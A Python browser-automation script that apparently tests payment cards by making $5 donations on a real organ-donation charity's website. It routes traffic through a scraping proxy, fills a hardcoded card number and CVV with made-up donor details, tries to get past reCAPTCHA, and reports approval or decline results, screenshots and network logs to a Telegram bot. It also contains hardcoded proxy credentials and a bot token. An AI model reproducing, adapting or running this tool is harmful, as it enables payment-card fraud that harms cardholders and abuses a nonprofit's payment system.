#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v11 — extract everything + robust fill
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def tg_long(label, text, chunk=3500):
    tg_msg(f"{label} (len={len(text)})")
    for i in range(0, len(text), chunk):
        tg_msg(f"<pre>{text[i:i+chunk]}</pre>")
        time.sleep(0.3)


def dump_frames(page, label="FRAMES"):
    try:
        info = []
        for i, f in enumerate(page.frames):
            try:
                info.append(f"#{i} name='{f.name or ''}' url='{(f.url or '')[:80]}'")
            except Exception:
                info.append(f"#{i} (unreadable)")
        tg_msg(f"📋 {label} ({len(info)}):\n" + "\n".join(info))
    except Exception as e:
        tg_msg(f"⚠️ dump_frames: {e}")


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
        if attempt % 10 == 0:
            dump_frames(page, f"Attempt {attempt}")
        time.sleep(2)
    return None, attempt


def check_reject_in_text(text):
    for line in text.split("\n"):
        l = line.strip()
        if "REJECT" in l.upper() or "DECLINED" in l.upper():
            return l
    return None


# ═══════════════════════════════════════════════════
#  EXTRACTION
# ═══════════════════════════════════════════════════

def extract_form_info(frame):
    """يستخرج كل input, select, button من الفورم"""
    try:
        info = frame.evaluate("""() => {
            const result = {inputs: [], selects: [], buttons: [], scripts: [], forms: []};
            document.querySelectorAll('input').forEach(el => {
                result.inputs.push({
                    id: el.id, name: el.name, type: el.type,
                    value: el.value, placeholder: el.placeholder || '',
                    maxlength: el.maxLength || null,
                    pattern: el.pattern || null,
                    readonly: el.readOnly, disabled: el.disabled,
                    visible: !!(el.offsetWidth || el.offsetHeight || el.getClientRects().length)
                });
            });
            document.querySelectorAll('select').forEach(el => {
                result.selects.push({
                    id: el.id, name: el.name,
                    value: el.value,
                    options: Array.from(el.options).map(o => ({v: o.value, t: o.text})).slice(0, 20)
                });
            });
            document.querySelectorAll('button, input[type=submit]').forEach(el => {
                result.buttons.push({
                    id: el.id, name: el.name, type: el.type,
                    value: el.value, text: (el.innerText || '').slice(0, 40),
                    visible: !!(el.offsetWidth || el.offsetHeight || el.getClientRects().length)
                });
            });
            document.querySelectorAll('script[src]').forEach(el => {
                result.scripts.push(el.src);
            });
            document.querySelectorAll('form').forEach(el => {
                result.forms.push({
                    id: el.id, name: el.name,
                    action: el.action, method: el.method
                });
            });
            return result;
        }""")
        tg_long("📋 FORM INFO", json.dumps(info, indent=1, ensure_ascii=False))
        return info
    except Exception as e:
        tg_msg(f"⚠️ extract: {str(e)[:200]}")
        return {}


def extract_network(page, network_log, label="NETWORK"):
    """يبعت network requests المهمة"""
    try:
        important = []
        for req in network_log:
            url = req.get("url", "").lower()
            if any(k in url for k in ["payment", "charge", "donate", "card", "transaction",
                                       "submit", "process", "authorize", "token", "otp"]):
                important.append(req)
        if important:
            txt = json.dumps(important[:30], indent=1, ensure_ascii=False)
            tg_long(f"📡 {label}", txt)
        else:
            tg_msg(f"📡 {label}: no important requests")
    except Exception as e:
        tg_msg(f"⚠️ network: {str(e)[:150]}")


# ═══════════════════════════════════════════════════
#  FILL METHODS
# ═══════════════════════════════════════════════════

def js_set_value(frame, field_suffix, value):
    """JS مباشر + كل events ممكنة"""
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.focus();
                el.value = val;
                ['input','change','keydown','keyup','beforeinput'].forEach(evt => {
                    try { el.dispatchEvent(new Event(evt, {bubbles: true})); } catch(e){}
                });
                return true;
            }""",
            [f"{P}{field_suffix}", str(value)]
        )
        return ok
    except Exception:
        return False


def js_read_value(frame, field_suffix):
    try:
        return frame.evaluate(
            """(id) => {
                const el = document.getElementById(id);
                return el ? el.value : null;
            }""",
            f"{P}{field_suffix}"
        )
    except Exception:
        return None


def try_fill_5_ways(frame, field_suffix, value, label=""):
    """
    يجرب 5 طرق لملء الحقل ويتحقق من النتيجة
    """
    tg_msg(f"🔄 Trying 5 methods for {label or field_suffix}...")
    selector = sid(field_suffix)

    # 1. fill() بسيط
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=8000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        time.sleep(0.5)
        if js_read_value(frame, field_suffix) == str(value):
            tg_msg(f"✅ Method 1 (fill) worked for {label}")
            return True
        else:
            tg_msg(f"❌ Method 1 (fill): value lost")
    except Exception as e:
        tg_msg(f"❌ Method 1: {str(e)[:100]}")

    # 2. type() مع delay
    try:
        el = frame.locator(selector).first
        el.fill("", timeout=3000)
        el.type(str(value), delay=80, timeout=10000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        time.sleep(0.5)
        if js_read_value(frame, field_suffix) == str(value):
            tg_msg(f"✅ Method 2 (type delay=80) worked for {label}")
            return True
        else:
            tg_msg(f"❌ Method 2 (type): value lost")
    except Exception as e:
        tg_msg(f"❌ Method 2: {str(e)[:100]}")

    # 3. JS set بدون blur
    try:
        if js_set_value(frame, field_suffix, value):
            time.sleep(0.5)
            if js_read_value(frame, field_suffix) == str(value):
                tg_msg(f"✅ Method 3 (JS no blur) worked for {label}")
                return True
            else:
                tg_msg(f"❌ Method 3 (JS): value lost")
    except Exception as e:
        tg_msg(f"❌ Method 3: {str(e)[:100]}")

    # 4. keyboard.type بعد focus
    try:
        el = frame.locator(selector).first
        el.click(timeout=3000)
        el.fill("", timeout=3000)
        frame.evaluate(f"""() => {{
            const el = document.getElementById('{P}{field_suffix}');
            if (el) el.focus();
        }}""")
        page = frame.page
        page.keyboard.type(str(value), delay=100)
        time.sleep(0.5)
        if js_read_value(frame, field_suffix) == str(value):
            tg_msg(f"✅ Method 4 (keyboard.type) worked for {label}")
            return True
        else:
            tg_msg(f"❌ Method 4 (keyboard): value lost")
    except Exception as e:
        tg_msg(f"❌ Method 4: {str(e)[:100]}")

    # 5. JS set + blur فوري
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                el.blur();
                return true;
            }""",
            [f"{P}{field_suffix}", str(value)]
        )
        time.sleep(0.5)
        if js_read_value(frame, field_suffix) == str(value):
            tg_msg(f"✅ Method 5 (JS + blur) worked for {label}")
            return True
        else:
            tg_msg(f"❌ Method 5 (JS + blur): value lost")
    except Exception as e:
        tg_msg(f"❌ Method 5: {str(e)[:100]}")

    tg_msg(f"⛔ All 5 methods failed for {label or field_suffix}")
    return False


# ═══════════════════════════════════════════════════
#  AMOUNT
# ═══════════════════════════════════════════════════

def set_amount_v11(frame, amount):
    """يحاول 3 طرق لتحديد المبلغ"""
    tg_msg(f"🔄 Setting amount = {amount} (v11, 3 methods)")

    # 1. اضغط على label الـ Other
    try:
        labels = frame.locator(f'label[for="{P}rb_amount:4"]')
        if labels.count() > 0:
            labels.first.click(timeout=5000)
            tg_msg("✅ Method 1: clicked label for Other")
        else:
            tg_msg("⚠️ Method 1: no label, trying radio direct")
            frame.locator(sid("rb_amount:4")).first.check(timeout=5000)
            tg_msg("✅ Method 1b: radio checked")
    except Exception as e:
        tg_msg(f"⚠️ Method 1: {str(e)[:120]}")

    time.sleep(3)

    # 2. ادخل المبلغ بـ JS + كل events
    try:
        ok = frame.evaluate(
            """(amt) => {
                const el = document.querySelector('input[id*="other_amount"]');
                if (!el) return false;
                el.value = amt;
                ['input','change','keyup','keydown','blur'].forEach(evt => {
                    try { el.dispatchEvent(new Event(evt, {bubbles: true})); } catch(e){}
                });
                return true;
            }""",
            str(amount)
        )
        tg_msg(f"{'✅' if ok else '❌'} Method 2: JS set amount")
    except Exception as e:
        tg_msg(f"❌ Method 2: {str(e)[:120]}")

    time.sleep(3)

    # 3. استنى label يتحدث
    for i in range(15):
        try:
            check = frame.evaluate(
                """() => {
                    const oa = document.querySelector('input[id*="other_amount"]');
                    const lt = document.getElementById('label_total_amount');
                    const rb = document.getElementById('""" + P + """rb_amount:4');
                    return {
                        other_value: oa ? oa.value : null,
                        total_label: lt ? lt.value : null,
                        radio_checked: rb ? rb.checked : null
                    };
                }"""
            )
            tg_msg(f"📋 attempt {i}: {json.dumps(check, ensure_ascii=False)}")
            if check.get("total_label") and check["total_label"] not in ["$ 0.00", "$ 25.00", ""]:
                if str(amount) in check["total_label"] or "5" in check["total_label"]:
                    tg_msg(f"✅ total updated: {check['total_label']}")
                    return True
            if check.get("radio_checked") == False:
                # جرب نضغط radio تاني
                try:
                    frame.locator(sid("rb_amount:4")).first.check(timeout=3000)
                    tg_msg("🔄 re-checked radio")
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(2)

    tg_msg(f"⚠️ total label didn't update. Final state check...")
    return False


# ═══════════════════════════════════════════════════
#  CAPTCHA
# ═══════════════════════════════════════════════════

def solve_captcha_once(frame, page):
    tg_msg("🔄 [7] reCAPTCHA — single attempt")
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Current token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            tg_msg("✅ reCAPTCHA already solved")
            return True
    except Exception:
        pass

    try:
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA checkbox")
                    break
            except Exception:
                continue

        for i in range(20):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception:
                pass
            time.sleep(1)
        tg_msg("⚠️ reCAPTCHA still empty")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False


# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════

def run():
    tg_msg("🚀 Gift of Life Donation v11 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # Network log
    network_log = []
    page.on("request", lambda req: network_log.append({
        "type": "request", "url": req.url, "method": req.method,
        "post_data": (req.post_data or "")[:500]
    }))
    page.on("response", lambda res: network_log.append({
        "type": "response", "url": res.url, "status": res.status
    }))

    # 1. فتح الصفحة
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    # 2. ابحث عن الـ frame
    tg_msg("🔄 [2] Searching for form fields in ANY frame...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        tg_msg("❌ no frame with fields — reload")
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ still not found")
        return

    tg_msg(f"✅ using frame name='{frame.name}' attempts={attempts}")
    time.sleep(5)

    # 3. استخرج كل معلومات الفورم
    tg_msg("🔄 [3] Extracting form info...")
    form_info = extract_form_info(frame)

    # 4. المبلغ
    tg_msg("🔄 [4] Setting amount with 3 methods...")
    amount_ok = set_amount_v11(frame, DONATION_AMOUNT)
    tg_msg(f"{'✅' if amount_ok else '❌'} amount setting completed")

    # 5. بيانات المتبرع — JS
    tg_msg("🔄 [5] Filling donor info...")
    for field, value, label in [
        ("datafirst", FIRST_NAME, "First name"),
        ("datalast", LAST_NAME, "Last name"),
        ("email", EMAIL, "Email"),
        ("data_phone", PHONE, "Phone"),
        ("data_address_one", ADDRESS_1, "Address"),
        ("data_address_two", ADDRESS_2, "Apt/Suite"),
        ("data_address_city", CITY, "City"),
        ("data_address_zip", ZIP, "Zip"),
    ]:
        if js_set_value(frame, field, value):
            actual = js_read_value(frame, field)
            tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label}: '{actual}'")
        else:
            tg_msg(f"❌ {label}")

    # Country
    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            frame.evaluate(
                """([id, val]) => {
                    const el = document.getElementById(id);
                    if (el) {
                        el.value = val;
                        el.dispatchEvent(new Event('change', {bubbles: true}));
                    }
                }""",
                [f"{P}data_Rcountry", us_value]
            )
            tg_msg(f"✅ Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    # State
    frame.evaluate(
        """([id, val]) => {
            const el = document.getElementById(id);
            if (el) {
                el.value = val;
                el.dispatchEvent(new Event('change', {bubbles: true}));
            }
        }""",
        [f"{P}data_Rstate", STATE_VALUE]
    )
    tg_msg(f"✅ State (CA)")

    # 6. البطاقة — نستخدم try_fill_5_ways
    tg_msg("🔄 [6] Filling card info with 5 methods each...")

    # Name
    try_fill_5_ways(frame, "nameOnCard", CARD_NAME, "Card name")

    # Number
    try_fill_5_ways(frame, "cardNumber", CARD_NUMBER, "Card number")

    # CVV
    try_fill_5_ways(frame, "cardCSV", CARD_CVV, "CVV")

    # Card type
    try:
        frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            [f"{P}cardType", CARD_TYPE]
        )
        tg_msg(f"✅ Card type (JS): {CARD_TYPE}")
    except Exception as e:
        tg_msg(f"⚠️ card type: {str(e)[:120]}")

    # Exp month
    try:
        frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (el) {
                    el.value = val;
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                }
            }""",
            [f"{P}expiration_date_month", CARD_MONTH]
        )
        tg_msg(f"✅ Exp month: {CARD_MONTH}")
    except Exception as e:
        tg_msg(f"⚠️ exp month: {str(e)[:100]}")

    # Exp year
    try:
        frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (el) {
                    el.value = val;
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                }
            }""",
            [f"{P}expiration_date_year", CARD_YEAR]
        )
        tg_msg(f"✅ Exp year: {CARD_YEAR}")
    except Exception as e:
        tg_msg(f"⚠️ exp year: {str(e)[:100]}")

    # 7. screenshot
    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception:
        pass

    # 8. استخرج network قبل captcha
    extract_network(page, network_log, "NETWORK PRE-CAPTCHA")

    # 9. reCAPTCHA
    captcha_ok = solve_captcha_once(frame, page)

    # 10. Pre-submit state
    tg_msg("🔄 [10] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            const oa = document.querySelector('input[id*="other_amount"]');
            const lt = document.getElementById('label_total_amount');
            return {{
                first: g('datafirst'),
                last: g('datalast'),
                email: g('email'),
                phone: g('data_phone'),
                addr1: g('data_address_one'),
                addr2: g('data_address_two'),
                city: g('data_address_city'),
                zip: g('data_address_zip'),
                state: g('data_Rstate'),
                country: g('data_Rcountry'),
                card_name: g('nameOnCard'),
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                exp_month: g('expiration_date_month'),
                exp_year: g('expiration_date_year'),
                card_type: g('cardType'),
                other_amount: oa ? oa.value : null,
                total_label: lt ? lt.value : null,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 11. Submit
    tg_msg("🔄 [11] Clicking Submit...")
    try:
        btn = frame.locator(sid("j_idt1913")).first
        btn.wait_for(state="visible", timeout=10000)
        btn.click(timeout=5000)
        tg_msg("✅ Submit clicked")
    except Exception as e:
        tg_msg(f"⚠️ Submit click: {str(e)[:150]}")
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{P}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click")
        except Exception:
            pass

    time.sleep(10)

    # 12. النتيجة
    tg_msg("🔄 [12] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    final_result = None
    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        r = check_reject_in_text(iframe_text)
        if r:
            final_result = r
            tg_msg(f"⛔ SERVER REJECT: {r}")
    except Exception:
        pass

    if not final_result:
        try:
            main_text = page.evaluate("document.body.innerText")
            r = check_reject_in_text(main_text)
            if r:
                final_result = r
                tg_msg(f"⛔ SERVER REJECT (main): {r}")
        except Exception:
            pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
        else:
            tg_msg("⚠️ no keywords. iframe preview:\n<pre>" + iframe_text[:1500] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    if final_result:
        tg_msg(f"🏁 FINAL RESULT: {final_result}")
    else:
        tg_msg("🏁 FINAL RESULT: unknown")

    # 13. استخرج network بعد Submit
    extract_network(page, network_log, "NETWORK POST-SUBMIT")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
